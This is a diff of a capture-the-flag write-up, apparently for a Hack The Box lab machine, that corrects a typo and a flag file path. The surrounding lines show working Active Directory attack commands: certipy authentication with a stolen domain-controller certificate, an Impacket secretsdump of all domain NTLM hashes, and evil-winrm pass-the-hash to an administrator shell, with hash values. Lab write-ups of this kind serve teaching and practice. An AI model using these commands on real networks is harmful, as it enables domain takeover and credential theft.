@@ -243,13 +243,13 @@ As can be seen, we know have obtained a PFX certificate for the DC, which can be
 {% highlight csharp %}
 certipy auth -pfx cfn-svrdc01
 {% endhighlight %}
-This gives us the NTLM hash for the  cfn-svrdc01 machine account. With this, we can then use Impacket's secretsdump to obtain all NTLM hashes for all uses in the domain (since this is a domain controller)/on the cfn-svrdc01 machine.
+This gives us the NTLM hash for the cfn-svrdc01 machine account. With this, we can then use Impacket's secretsdump to obtain all NTLM hashes for all uses in the domain (since this is a domain controller)/on the cfn-svrdc01 machine.
 
 {% highlight csharp %}
 secretsdump.py 'cfn-svrdc01$'@certification.htb -hashes :d85512d5e138a972140986b9cc664d7a
 {% endhighlight %}
 {% include figure image_path="/assets/img/secretsdump.png" %}
-With the Administrator hash, we can use evil-winrm to Pass-the-Hash and get a shell with administrator privileges on the machine and read the root.txt flag in C:\Users\Administrator\root.txt
+With the Administrator hash, we can use evil-winrm to Pass-the-Hash and get a shell with administrator privileges on the machine and read the root.txt flag in C:\Users\Administrator\Desktop\root.txt
 {% highlight csharp %}
 evil-winrm -i cfn-svrdc01.certification.htb -u administrator -H 30d9a71719214d675de29308730c0cb0
 {% endhighlight %}
